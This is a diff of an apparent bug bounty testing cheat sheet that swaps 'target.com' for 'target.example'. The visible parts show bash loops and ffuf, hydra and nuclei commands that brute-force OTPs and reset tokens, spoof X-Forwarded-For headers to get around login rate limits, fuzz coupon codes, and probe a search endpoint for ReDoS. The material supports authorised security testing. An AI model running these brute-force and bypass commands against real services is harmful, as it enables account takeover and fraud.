@@ -12,7 +12,7 @@ Pattern library built from 33 public bug bounty reports.
 **Test (no lockout after 100 attempts):**
 ```bash
 for CODE in $(seq -f "%06g" 0 100); do
-  RESP=$(curl -s -X POST https://target.com/api/v2/auth/verify-otp \
+  RESP=$(curl -s -X POST https://target.example/api/v2/auth/verify-otp \
     -H "Cookie: pre_auth_session=SESSION" \
     -H "Content-Type: application/json" \
     -d "{\"otp\": \"$CODE\"}" \
@@ -36,7 +36,7 @@ done
 **Test:**
 ```bash
 for TOKEN in $(seq -f "%04g" 0 9999); do
-  RESP=$(curl -s "https://target.com/reset?token=$TOKEN&email=test@own-account.com" \
+  RESP=$(curl -s "https://target.example/reset?token=$TOKEN&email=test@own-account.com" \
     -o /dev/null -w "%{http_code}")
   [ "$RESP" = "200" ] && echo "VALID TOKEN: $TOKEN"
   [ "$RESP" = "429" ] && { echo "Rate limited at $TOKEN"; break; }
@@ -69,11 +69,11 @@ done
 ```bash
 for i in $(seq 1 1000); do
   FAKE_IP="10.$(( RANDOM % 256 )).$(( RANDOM % 256 )).$(( RANDOM % 256 ))"
-  curl -s -X POST https://target.com/api/login \
+  curl -s -X POST https://target.example/api/login \
     -H "X-Forwarded-For: $FAKE_IP" \
     -H "X-Real-IP: $FAKE_IP" \
     -H "Content-Type: application/json" \
-    -d "{\"email\": \"admin@target.com\", \"password\": \"test$i\"}" \
+    -d "{\"email\": \"admin@target.example\", \"password\": \"test$i\"}" \
     -o /dev/null -w "%{http_code}\n"
 done
 ```
@@ -88,7 +88,7 @@ done
 **No rate limit on coupon validation:**
 
 ```bash
-ffuf -u https://target.com/api/checkout/apply-coupon \
+ffuf -u https://target.example/api/checkout/apply-coupon \
   -X POST \
   -H "Content-Type: application/json" \
   -H "Cookie: session=SESSION" \
@@ -121,7 +121,7 @@ ffuf -u https://target.com/api/checkout/apply-coupon \
 for LEN in 10 20 30 40 50; do
   INPUT=$(python3 -c "print('a'*$LEN + '!')")
   TIME=$(curl -s -o /dev/null -w "%{time_total}" \
-    "https://target.com/api/search?q=$INPUT")
+    "https://target.example/api/search?q=$INPUT")
   echo "Length $LEN: ${TIME}s"
 done
 # 10: 0.08s | 20: 0.31s | 30: 1.24s | 40: 5.9s | 50: timeout
@@ -135,7 +135,7 @@ done
 
 ```bash
 # ffuf OTP brute
-ffuf -u https://target.com/api/verify-otp \
+ffuf -u https://target.example/api/verify-otp \
   -X POST -H "Content-Type: application/json" \
   -H "Cookie: session=SESSION" \
   -d '{"otp": "FUZZ"}' \
@@ -143,11 +143,11 @@ ffuf -u https://target.com/api/verify-otp \
   -mc 200
 
 # hydra login brute
-hydra -l admin@target.com -P /usr/share/wordlists/rockyou.txt target.com \
+hydra -l admin@target.example -P /usr/share/wordlists/rockyou.txt target.example \
   http-post-form "/api/login:email=^USER^&password=^PASS^:invalid"
 
 # nuclei rate-limit
-nuclei -u https://target.com -t brute-force/ -severity medium,high,critical
+nuclei -u https://target.example -t brute-force/ -severity medium,high,critical
 ```
 
 ### No rate-limit on short codes / tokens (invite, OTP, recovery)
